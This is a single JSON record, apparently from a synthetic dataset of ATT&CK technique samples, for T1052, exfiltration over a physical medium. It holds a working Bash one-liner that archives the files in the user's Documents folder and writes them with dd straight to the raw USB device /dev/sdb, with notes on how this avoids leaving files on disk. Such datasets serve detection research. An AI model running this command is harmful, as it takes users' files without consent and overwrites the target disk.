@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "find \"$HOME/Documents\" -type f -maxdepth 1 -print0 | tar --null -T - -czf - | dd of=\"/dev/sdb\" bs=4M oflag=direct status=none",
+  "explanation": "Selects files from Documents and streams a compressed archive directly to the raw USB disk, avoiding file creation on the mounted filesystem.",
+  "rationale_steps": [
+    "Enumerate target files and feed them to tar via null-delimited list",
+    "Compress to minimize size and write time",
+    "Write the stream to the USB block device using dd with large blocks and direct I/O"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-4585860b-cf388896",
+  "source_prompt_hash": "4585860b",
+  "timestamp_utc": "2025-09-30T05:09:05.177002Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
